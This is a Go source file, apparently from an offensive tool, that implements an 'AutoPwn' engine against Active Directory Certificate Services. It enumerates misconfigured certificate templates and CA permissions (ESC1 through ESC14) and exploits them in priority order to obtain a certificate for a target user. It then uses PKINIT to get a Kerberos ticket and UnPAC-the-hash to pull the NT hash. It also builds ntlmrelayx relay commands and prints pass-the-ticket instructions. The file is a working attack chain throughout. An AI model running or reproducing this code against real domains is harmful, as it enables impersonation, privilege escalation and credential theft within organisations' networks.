package pki

import (
	"bufio"
	"context"
	"crypto"
	"crypto/x509"
	"fmt"
	"os"
	"path/filepath"
	"sort"
	"strings"
	"time"

	"github.com/go-ldap/ldap/v3"
)

// AutoPwnConfig holds parameters for the auto-pwn orchestration engine.
type AutoPwnConfig struct {
	*ADCSConfig
	TargetUPN   string
	AttackerDN  string // needed for ESC9/ESC10
	VictimDN    string // needed for ESC14
	OutputDir   string
	DryRun      bool
	Interactive bool // prompt user to select which ESC path(s) to try
}

// AutoPwnResult holds the outcome of a successful auto-pwn run.
type AutoPwnResult struct {
	ESCPath      string `json:"esc_path"`
	TemplateName string `json:"template_name"`
	CertPath     string `json:"cert_path,omitempty"`
	KeyPath      string `json:"key_path,omitempty"`
	PFXPath      string `json:"pfx_path,omitempty"`
	CcachePath   string `json:"ccache_path,omitempty"`   // ccache from PKINIT
	NTHash       string `json:"nt_hash,omitempty"`       // from UnPAC-the-hash
	RelayCommand string `json:"relay_command,omitempty"` // for ESC8/ESC11
}

// escCandidate represents a single exploitable path discovered during enumeration.
type escCandidate struct {
	escType      string
	score        int
	templateName string
	caName       string
	caHostname   string
	relayCommand string
	isRelay      bool
}

// AutoPwn performs automated exploitation by enumerating all ADCS findings,
// building a priority-sorted list of exploitable paths, and attempting
// exploitation interactively or automatically until one succeeds.
func AutoPwn(ctx context.Context, cfg *AutoPwnConfig) (*AutoPwnResult, error) {
	conn, err := ConnectLDAP(ctx, cfg.ADCSConfig)
	if err != nil {
		return nil, err
	}
	defer conn.Close()

	fmt.Println("[*] AutoPwn: Starting full ADCS enumeration...")

	// Step 1: Enumerate everything
	enumResult, err := EnumerateAll(ctx, cfg.ADCSConfig, conn)
	if err != nil {
		return nil, fmt.Errorf("enumeration failed: %w", err)
	}

	fmt.Printf("[+] Enumeration complete: %d templates, %d total findings\n",
		len(enumResult.Templates), enumResult.VulnCount)

	// Step 2: Build priority-sorted candidate list
	candidates := buildCandidates(cfg, &enumResult)

	if len(candidates) == 0 {
		return nil, fmt.Errorf("no exploitable paths found — environment appears hardened")
	}

	// Sort by score descending (highest priority first)
	sort.Slice(candidates, func(i, j int) bool {
		return candidates[i].score > candidates[j].score
	})

	if cfg.DryRun {
		fmt.Println("[*] DRY RUN — no exploitation attempted")
		fmt.Println("[*] Attack plan:")
		for i, c := range candidates {
			if c.isRelay {
				fmt.Printf("  %d. %s: %s\n", i+1, c.escType, c.relayCommand)
			} else {
				fmt.Printf("  %d. %s on template %q targeting %s\n",
					i+1, c.escType, c.templateName, cfg.TargetUPN)
			}
		}

		upnUser := cfg.TargetUPN
		if idx := strings.Index(upnUser, "@"); idx > 0 {
			upnUser = upnUser[:idx]
		}
		fmt.Println("\n[*] After exploitation, PKINIT will run automatically.")
		return nil, nil
	}

	// Ensure output directory exists
	if err := os.MkdirAll(cfg.OutputDir, 0700); err != nil {
		return nil, fmt.Errorf("create output directory %s: %w", cfg.OutputDir, err)
	}

	fmt.Printf("\n[+] Found %d exploitable path(s). Iterating by priority...\n", len(candidates))

	var cert *x509.Certificate
	var key crypto.Signer

	// Step 4: Attempt exploitation in priority order, stop on first success
	for i, c := range candidates {
		if cfg.Interactive {
			relay := ""
			if c.isRelay {
				relay = " [RELAY]"
			}
			fmt.Printf("\n[?] Path %d/%d: Discovered %s%s via %q (Score: %d). Exploit this path now? [y/N/q/all]: ",
				i+1, len(candidates), c.escType, relay, c.templateName, c.score)

			scanner := bufio.NewScanner(os.Stdin)
			if !scanner.Scan() {
				break
			}
			ans := strings.ToLower(strings.TrimSpace(scanner.Text()))
			if ans == "q" {
				return nil, fmt.Errorf("aborted by user")
			}
			if ans == "all" {
				cfg.Interactive = false // auto try everything
				fmt.Println("[*] Switching to automatic execution mode...")
			} else if ans != "y" {
				continue
			}
		}

		if c.isRelay {
			fmt.Printf("\n[*] Path %d/%d: %s — relay attack\n", i+1, len(candidates), c.escType)
			if c.escType == "ESC8" && c.caHostname != "" {
				fmt.Printf("[*] Starting built-in NTLM relay server...\n")
				fmt.Printf("[*] Relaying to: %s (%s) template: %s\n", c.caName, c.caHostname, c.templateName)
				var relayErr error
				cert, key, relayErr = RunRelayServer(
					c.caHostname, c.templateName, cfg.TargetUPN,
					80, 120*time.Second,
				)
				if relayErr != nil {
					fmt.Printf("[!] Built-in relay failed: %v\n", relayErr)
					fmt.Printf("[*] Manual command: %s\n", c.relayCommand)
					return &AutoPwnResult{
						ESCPath:      c.escType,
						TemplateName: c.templateName,
						RelayCommand: c.relayCommand,
					}, nil
				}
			} else {
				fmt.Printf("[*] Manual relay command: %s\n", c.relayCommand)
				return &AutoPwnResult{
					ESCPath:      c.escType,
					TemplateName: c.templateName,
					RelayCommand: c.relayCommand,
				}, nil
			}
		} else {
			fmt.Printf("\n[*] Path %d/%d: Attempting %s on template %q...\n",
				i+1, len(candidates), c.escType, c.templateName)

			var exploitErr error
			cert, key, exploitErr = executeExploit(ctx, cfg, conn, c)
			if exploitErr != nil {
				fmt.Printf("[!] %s failed: %v\n", c.escType, exploitErr)
				if !cfg.Interactive {
					fmt.Println("[*] Trying next path...")
				}
				continue
			}
		}

		if IsSelfSigned(cert) {
			fmt.Printf("[!] %s on %q produced a self-signed cert (CA enrollment failed) — skipping\n", c.escType, c.templateName)
			if !cfg.Interactive {
				fmt.Println("[*] Trying next path...")
			}
			continue
		}

		// Step 5: Write output files
		result, writeErr := writeAutoPwnOutput(cfg, c, cert, key)
		if writeErr != nil {
			fmt.Printf("[!] Output write failed: %v\n", writeErr)
			continue
		}

		// Step 6: Attempt PKINIT + UnPAC-the-hash using the enrolled certificate
		fmt.Printf("\n[+] AutoPwn SUCCESS via %s on template %q\n\n", c.escType, c.templateName)

		// Try real PKINIT authentication
		pkinitResult, pkinitErr := PKINITAuth(&PKINITConfig{
			Cert:      cert,
			Key:       key,
			DC:        cfg.TargetDC,
			Domain:    cfg.Domain,
			UPN:       cfg.TargetUPN,
			OutputDir: cfg.OutputDir,
		})
		if pkinitErr != nil {
			fmt.Printf("[!] Built-in PKINIT failed: %v\n", pkinitErr)
			fmt.Println("[*] Falling back to external tool guidance:")
			PrintPKINITGuidance(&PKINITInfo{
				CertPath: result.CertPath, KeyPath: result.KeyPath,
				PFXPath: result.PFXPath, DC: cfg.TargetDC,
				Domain: cfg.Domain, TargetUPN: cfg.TargetUPN,
			})
			if result.PFXPath != "" {
				PrintUnPACGuidance(result.PFXPath, "", cfg.TargetDC, cfg.Domain, cfg.TargetUPN)
			}
			return result, nil
		}

		result.CcachePath = pkinitResult.CcachePath

		// Try UnPAC-the-hash to extract NT hash
		upnUser := cfg.TargetUPN
		if idx := strings.Index(upnUser, "@"); idx > 0 {
			upnUser = upnUser[:idx]
		}
		unpacResult, unpacErr := UnPACTheHash(&UnPACConfig{
			TGTRaw:     pkinitResult.TGTRaw,
			SessionKey: pkinitResult.SessionKey,
			Etype:      pkinitResult.Etype,
			ReplyKey:   pkinitResult.ReplyKey,
			ReplyEtype: pkinitResult.ReplyEtype,
			DC:         cfg.TargetDC,
			Domain:     cfg.Domain,
			Username:   upnUser,
		})
		if unpacErr != nil {
			fmt.Printf("[!] UnPAC-the-hash failed: %v\n", unpacErr)
			fmt.Println("[*] TGT is still valid — use pass-the-ticket:")
			fmt.Printf("    export KRB5CCNAME=%s\n", pkinitResult.CcachePath)
		} else {
			result.NTHash = unpacResult.NTHash
		}

		return result, nil
	}

	return nil, fmt.Errorf("all exploitation paths exhausted — none succeeded")
}

// buildCandidates constructs the prioritized list of exploitable paths from enumeration results.
func buildCandidates(cfg *AutoPwnConfig, result *EnumerationResult) []escCandidate {
	var candidates []escCandidate

	// Template-level vulnerabilities from EnumerateTemplates scoring
	for _, tmpl := range result.Templates {
		for _, vuln := range tmpl.ESCVulns {
			switch vuln {
			case "ESC1":
				candidates = append(candidates, escCandidate{
					escType: "ESC1", score: 10, templateName: tmpl.Name,
				})
			case "ESC2":
				candidates = append(candidates, escCandidate{
					escType: "ESC2", score: 8, templateName: tmpl.Name,
				})
			case "ESC3":
				candidates = append(candidates, escCandidate{
					escType: "ESC3", score: 7, templateName: tmpl.Name,
				})
			case "ESC4-EXPLOITABLE":
				candidates = append(candidates, escCandidate{
					escType: "ESC4", score: 6, templateName: tmpl.Name,
				})
			case "ESC6":
				candidates = append(candidates, escCandidate{
					escType: "ESC6", score: 9, templateName: tmpl.Name,
				})
			case "ESC9":
				if cfg.AttackerDN != "" {
					candidates = append(candidates, escCandidate{
						escType: "ESC9", score: 6, templateName: tmpl.Name,
					})
				}
			}
		}
	}

	// ESC7: Vulnerable CA ACLs (ManageCA → enable ESC6 → exploit)
	for _, f := range result.ESC7Findings {
		candidates = append(candidates, escCandidate{
			escType: "ESC7", score: 4, caName: f.CAName,
		})
	}

	// ESC5: Vulnerable CA object ACLs (GenericAll/WriteDACL → enable ESC6 → exploit)
	for _, f := range result.ESC5Findings {
		candidates = append(candidates, escCandidate{
			escType: "ESC5", score: 4, caName: f.CAName,
		})
	}

	// ESC10: Weak certificate mapping (chains to ESC9 methodology)
	if cfg.AttackerDN != "" {
		for _, f := range result.ESC10Findings {
			if len(f.VulnerableTemplates) > 0 {
				candidates = append(candidates, escCandidate{
					escType: "ESC10", score: 6, templateName: f.VulnerableTemplates[0],
				})
			}
		}
	}

	// ESC14: Weak explicit mappings
	if cfg.VictimDN != "" {
		for _, f := range result.ESC14Findings {
			candidates = append(candidates, escCandidate{
				escType: "ESC14", score: 6, templateName: f.TemplateName,
			})
		}
	}

	// ESC13: OID group link abuse
	for _, f := range result.ESC13Findings {
		candidates = append(candidates, escCandidate{
			escType: "ESC13", score: 5, templateName: f.TemplateName,
		})
	}

	// ESC8: NTLM relay to HTTP web enrollment (manual)
	for _, f := range result.ESC8Findings {
		if !f.NTLMEnabled {
			continue
		}
		tmplName := "Machine"
		if len(f.Templates) > 0 {
			tmplName = f.Templates[0]
		}
		relayCmd := fmt.Sprintf(
			"ntlmrelayx.py -t %scertfnsh.asp -smb2support --adcs --template %s",
			f.HTTPEndpoint, tmplName,
		)
		candidates = append(candidates, escCandidate{
			escType: "ESC8", score: 4, templateName: tmplName,
			caName: f.CAName, caHostname: f.CAHostname,
			relayCommand: relayCmd, isRelay: true,
		})
	}

	// ESC11: NTLM relay to RPC interface (manual)
	for _, f := range result.ESC11Findings {
		relayCmd := fmt.Sprintf(
			"ted esc 11 -t <TEMPLATE> -U <UPN> -l <IP> -dc %s",
			f.CAHostname,
		)
		candidates = append(candidates, escCandidate{
			escType: "ESC11", score: 3, templateName: f.CAName,
			caName: f.CAName, caHostname: f.CAHostname,
			relayCommand: relayCmd, isRelay: true,
		})
	}

	// ESC12: NTLM relay to DCOM interface (manual)
	for _, f := range result.ESC12Findings {
		relayCmd := fmt.Sprintf(
			"ted esc 12 -t <TEMPLATE> -U <UPN> -l <IP> -dc %s",
			f.CAHostname,
		)
		candidates = append(candidates, escCandidate{
			escType: "ESC12", score: 3, templateName: f.CAName,
			caName: f.CAName, caHostname: f.CAHostname,
			relayCommand: relayCmd, isRelay: true,
		})
	}

	return candidates
}

// executeExploit dispatches to the appropriate exploit function based on ESC type.
func executeExploit(ctx context.Context, cfg *AutoPwnConfig, conn *ldap.Conn, c escCandidate) (*x509.Certificate, crypto.Signer, error) {
	switch c.escType {
	case "ESC1":
		return ExploitESC1(ctx, cfg.ADCSConfig, conn, c.templateName, cfg.TargetUPN)
	case "ESC2":
		return ExploitESC2(ctx, cfg.ADCSConfig, conn, c.templateName, cfg.TargetUPN)
	case "ESC3":
		return ExploitESC3(ctx, cfg.ADCSConfig, conn, c.templateName, cfg.TargetUPN)
	case "ESC4-EXPLOITABLE", "ESC4":
		return ExploitESC4(ctx, cfg.ADCSConfig, conn, c.templateName, cfg.TargetUPN)
	case "ESC5":
		return ExploitESC5(ctx, cfg.ADCSConfig, conn, c.caName, cfg.TargetUPN)
	case "ESC6":
		return ExploitESC6(ctx, cfg.ADCSConfig, conn, c.templateName, cfg.TargetUPN)
	case "ESC7":
		return ExploitESC7(ctx, cfg.ADCSConfig, conn, c.caName, cfg.TargetUPN)
	case "ESC9":
		return ExploitESC9(ctx, cfg.ADCSConfig, conn, c.templateName, cfg.AttackerDN, cfg.TargetUPN)
	case "ESC10":
		return ExploitESC10(ctx, cfg.ADCSConfig, conn, c.templateName, cfg.AttackerDN, cfg.TargetUPN)
	case "ESC13":
		return ExploitESC13(ctx, cfg.ADCSConfig, conn, c.templateName, cfg.TargetUPN)
	case "ESC14":
		return ExploitESC14(ctx, cfg.ADCSConfig, conn, c.templateName, cfg.VictimDN)
	default:
		return nil, nil, fmt.Errorf("unsupported exploit type: %s", c.escType)
	}
}

// writeAutoPwnOutput writes cert, key, and PFX files to the output directory.
func writeAutoPwnOutput(cfg *AutoPwnConfig, c escCandidate, cert *x509.Certificate, key crypto.Signer) (*AutoPwnResult, error) {
	// Use UPN username as base, with ESC type suffix for disambiguation
	upnUser := cfg.TargetUPN
	if idx := strings.Index(upnUser, "@"); idx > 0 {
		upnUser = upnUser[:idx]
	}
	safeName := strings.ReplaceAll(upnUser, " ", "_")
	safeName = strings.ReplaceAll(safeName, "/", "_")

	baseName := fmt.Sprintf("%s_%s", safeName, strings.ToLower(strings.TrimSuffix(c.escType, "-EXPLOITABLE")))
	basePath := filepath.Join(cfg.OutputDir, baseName)

	if err := WriteCertKeyPEM(cert, key, basePath); err != nil {
		return nil, fmt.Errorf("write PEM: %w", err)
	}

	pfxPath := basePath + ".pfx"
	if err := WritePFX(cert, key, pfxPath, ""); err != nil {
		fmt.Printf("[!] PFX export failed (non-fatal): %v\n", err)
		pfxPath = ""
	}

	result := &AutoPwnResult{
		ESCPath:      c.escType,
		TemplateName: c.templateName,
		CertPath:     basePath + ".crt",
		KeyPath:      basePath + ".key",
		PFXPath:      pfxPath,
	}

	fmt.Printf("[+] Output files:\n")
	fmt.Printf("    Certificate: %s\n", result.CertPath)
	fmt.Printf("    Private key: %s\n", result.KeyPath)
	if pfxPath != "" {
		fmt.Printf("    PFX archive: %s\n", result.PFXPath)
	}

	return result, nil
}
